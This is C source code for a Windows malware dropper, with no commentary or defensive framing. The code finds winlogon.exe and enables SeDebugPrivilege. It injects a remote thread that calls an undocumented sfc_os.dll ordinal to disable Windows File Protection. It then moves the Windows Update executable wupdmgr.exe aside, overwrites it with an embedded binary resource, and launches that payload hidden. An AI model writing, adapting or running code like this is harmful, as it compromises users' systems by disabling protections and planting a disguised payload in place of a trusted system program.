
#include <windows.h>
#include <stdio.h>

BOOL AdjustPrivilege(char* lpName);
char* target = "\\system32\\wupdmgr.exe";
char* random = "\\winup.exe";

typedef BOOL(WINAPI *EnumProcessModules_t)(HANDLE, HMODULE*, DWORD, LPDWORD);
typedef DWORD(WINAPI *GetModuleBaseNameA_t)(HANDLE, HMODULE, LPSTR, DWORD);
typedef BOOL(WINAPI *EnumProcesses_t)(LPDWORD, DWORD, LPDWORD);

EnumProcessModules_t EnumProcessModules;
GetModuleBaseNameA_t GetModuleBaseNameA;
EnumProcesses_t EnumProcesses;

BOOL IsWinlogon(DWORD dwProcessId){
	char String1[MAX_PATH];
	char* String2 = "winlogon.exe";
	HMODULE hProcModule;
	DWORD cbNeeded;
	HANDLE hProcess;
	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION
		| PROCESS_VM_READ, FALSE, dwProcessId);
	if (hProcess == NULL){
		return FALSE;
	}
	if (!EnumProcessModules(hProcess, &hProcModule, 4, &cbNeeded)){
		CloseHandle(hProcess);
		return FALSE;
	}
	GetModuleBaseNameA(hProcess, hProcModule, String1, MAX_PATH);
	
	CloseHandle(hProcess);
	
	return stricmp(String2, String1) == 0;
	
}
BOOL DisableFileProtection(DWORD dwWinLogonPID){
	if (!AdjustPrivilege("SeDebugPrivilege")){
		return FALSE;
	}
	HANDLE hSfc = LoadLibraryA("sfc_os.dll"); 
	HANDLE hProcess;
	if (!hSfc){
		return FALSE;
	}
	FARPROC proc = GetProcAddress(hSfc, 2); // ordinal - CloseFileMapEnumeration
	hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE, dwWinLogonPID);
	if (!hProcess){
		FreeLibrary(hSfc);
		return FALSE;
	}
	CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)proc, NULL, 0, 0);
	FreeLibrary(hSfc);
	CloseHandle(hProcess);
	return TRUE;
	
}



BOOL AdjustPrivilege(char* lpName){
	HANDLE hToken = NULL; BOOL result;
	TOKEN_PRIVILEGES priv;
	result = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	if (!result){
		goto epilog;
	}
	priv.PrivilegeCount = 1;
	priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if(LookupPrivilegeValueA(NULL, lpName, &priv.Privileges[0].Luid)){	
		result = AdjustTokenPrivileges(hToken, FALSE, 
			&priv, 0, NULL, NULL);
		goto epilog;
	}
	result = FALSE;
	epilog:
	if (hToken){
		CloseHandle(hToken);
	}
	return result; 
	// origin returned FALSE on success, to me it just complicates it 
	
}

void RunResource(){
	HANDLE hFile;
	HMODULE hMod;
	HRSRC hRsrc; HGLOBAL hRsrcData;
	DWORD dwRsrcSize;
	DWORD written;
	char winDir[MAX_PATH];
	char filePath[MAX_PATH];
	GetWindowsDirectoryA(winDir, sizeof(winDir));
	snprintf(filePath,sizeof(filePath), "%s%s", winDir, target);
	
	hMod = GetModuleHandleA(NULL);
	hRsrc = FindResourceA(hMod, "#101", "BIN");
	hRsrcData = LoadResource(hMod, hRsrc);
	dwRsrcSize = SizeofResource(hMod, hRsrc);
	
	hFile = CreateFileA(filePath, GENERIC_WRITE,
		FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
	
	WriteFile(hFile, hRsrcData, dwRsrcSize, &written, NULL);
	CloseHandle(hFile);
	
	WinExec(filePath, SW_HIDE);
	
}

int main(){
	HANDLE hPsapi = LoadLibraryA("psapi.dll");
	FARPROC proc;
	proc = GetProcAddress(hPsapi, "EnumProcessModules");
	EnumProcessModules = (EnumProcessModules_t)proc;
	
	proc = GetProcAddress(hPsapi, "GetModuleBaseNameA");
	GetModuleBaseNameA = (GetModuleBaseNameA_t)proc;

	proc = GetProcAddress(hPsapi, "EnumProcesses");
	EnumProcesses = (EnumProcesses_t)proc;
	
	if (EnumProcessModules == NULL || GetModuleBaseNameA == NULL || EnumProcesses == NULL){
		return 1;
	}
	DWORD cbNeeded;
	DWORD lpidProcess[1024];
	if (!EnumProcesses(lpidProcess, sizeof(lpidProcess), &cbNeeded)){
		return 1;
	}
	cbNeeded >>= 2;// /= 4
	DWORD dwWinLogonPID = 0;
	
	for (DWORD i = 0; i < cbNeeded; i++){
		if (lpidProcess[i] == 0){
			continue;
		}
		if (IsWinlogon(lpidProcess[i])){
			dwWinLogonPID = lpidProcess[i];
			break;
		}
	}
	if (dwWinLogonPID == 0){
		return 1;
	}
	if (!DisableFileProtection(dwWinLogonPID)){
		return 1;
	}
	char winDir[MAX_PATH];
	char filePath[MAX_PATH];
	char randomFilePath[MAX_PATH];
	char tempDir[MAX_PATH];
	
	GetWindowsDirectoryA(winDir, MAX_PATH);
	snprintf(filePath,MAX_PATH, "%s%s", winDir, target);
	
	GetTempPathA(tempDir, MAX_PATH);
	snprintf(randomFilePath, MAX_PATH, "%s%s", tempDir, random);
	
	MoveFileA(filePath, randomFilePath);	
	RunResource();
	return 0;
	
}